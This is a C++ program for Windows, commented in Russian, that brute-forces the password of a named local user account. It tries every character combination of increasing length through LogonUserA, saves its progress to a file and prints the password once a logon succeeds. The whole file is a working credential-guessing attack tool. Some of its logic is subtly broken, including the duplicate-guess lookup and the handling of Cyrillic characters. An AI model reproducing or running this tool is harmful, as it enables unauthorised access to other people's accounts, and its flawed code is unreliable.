#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <ctime>
#include <windows.h>
#include <algorithm> // Для std::binary_search и std::sort
using namespace std;

clock_t start;

// Функция для попытки входа в систему
bool attemptLogin(const string& username, const string& password) {
    HANDLE tokenHandle;
    if (LogonUserA(username.c_str(), NULL, password.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &tokenHandle)) {
        CloseHandle(tokenHandle);
        return true; // Успешный вход
    }
    return false; // Неудачная попытка
}

// Функция для генерации всех комбинаций заданной длины
void generateCombinations(const string& charset, int length, string prefix, const string& username, vector<string>& triedPasswords) {
    if (length == 0) {
        if (!binary_search(triedPasswords.begin(), triedPasswords.end(), prefix)) {
            cout << "Попытка № " << triedPasswords.size() + 1 << " для пароля: " << prefix << endl;
            if (attemptLogin(username, prefix)) {
                cout << "Успех! Пароль найден: " << prefix << endl;
                clock_t end = clock();
                double elapsed = static_cast<double>(end - start) / CLOCKS_PER_SEC;
                cout << "Поиск завершен. Общее время выполнения: " << elapsed << " секунд." << endl;
                exit(0); // Завершение программы при успешном входе
            } else {
                triedPasswords.push_back(prefix); // Сохраняем неудачную попытку
            }
        }
        return;
    }
    for (char c : charset) {
        generateCombinations(charset, length - 1, prefix + c, username, triedPasswords);
    }
}

// Функция для загрузки прогресса из файла
void loadProgress(int& currentLength, vector<string>& triedPasswords, const string& progressFile) {
    ifstream file(progressFile);
    if (file.is_open()) {
        string line;
        while (getline(file, line)) {
            if (line.find("length:") == 0) {
                currentLength = stoi(line.substr(7));
            } else if (line.find("password:") == 0) {
                triedPasswords.push_back(line.substr(9));
            }
        }
        file.close();
    }
}

// Функция для сохранения прогресса в файл
void saveProgress(int currentLength, const vector<string>& triedPasswords, const string& progressFile) {
    ofstream file(progressFile);
    if (file.is_open()) {
        file << "length: " << currentLength << endl;
        for (const string& password : triedPasswords) {
            file << "password: " << password << endl;
        }
        file.close();
    }
}

int main() {
    setlocale(LC_ALL, "ru_RU.UTF-8");

    string username, charset, progressFile = "progress.txt";
    int minLength = 1; // Минимальная длина пароля
    vector<string> triedPasswords; // Список уже проверенных паролей
    int currentLength = minLength; // Текущая длина пароля

    // Загрузка прогресса
    loadProgress(currentLength, triedPasswords, progressFile);

    // Ввод имени пользователя
    cout << "Введите имя учетной записи: ";
    cin >> username;

    // Ввод набора символов для генерации паролей
    // Набор символов для генерации паролей
    vector<string> req_types = {"Цифры", "Латинские буквы", "Русские буквы", "Специальные символы"};
    string digits;
    int level = 1; // Текущий уровень

    while (true) {
        if (level > 4) { // Если достигнут последний уровень, выходим из цикла
            break;
        }

        cout << req_types[level - 1] << " (y/n): ";
        getline(cin >> ws, digits); // Считываем строку с клавиатуры

        if (digits == "y" || digits == "Y" || digits == "д" || digits == "Д") {
            if (level == 1) {
                charset += "0123456789"; // Добавляем цифры
            } else if (level == 2) {
                charset += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; // Добавляем латинские буквы
            } else if (level == 3) {
                charset += "абвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ"; // Добавляем русские буквы
            } else if (level == 4) {
                charset += "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"; // Добавляем специальные символы
            }
            level++; // Переходим к следующему уровню
        } else if (digits == "n" || digits == "N" || digits == "н" || digits == "Н") {
            level++; // Пропускаем текущий уровень
        } else {
            cout << "Вы неправильно ввели! Введите 'y' или 'n'." << endl;
            if (level > 1) {
                level--; // Возвращаемся на предыдущий уровень
            }
        }
    }
    



    start = clock();

    // Сортировка уже проверенных паролей для быстрого поиска
    sort(triedPasswords.begin(), triedPasswords.end());

    // Генерация и проверка паролей
    while (true) { // Бесконечный цикл, пока пароль не найден
        cout << "Начинаю проверку паролей длиной " << currentLength << " символов..." << endl;
        generateCombinations(charset, currentLength, "", username, triedPasswords);
        saveProgress(currentLength + 1, triedPasswords, progressFile); // Сохранение прогресса
        currentLength++; // Увеличиваем длину для следующей итерации
    }

    return 0;
}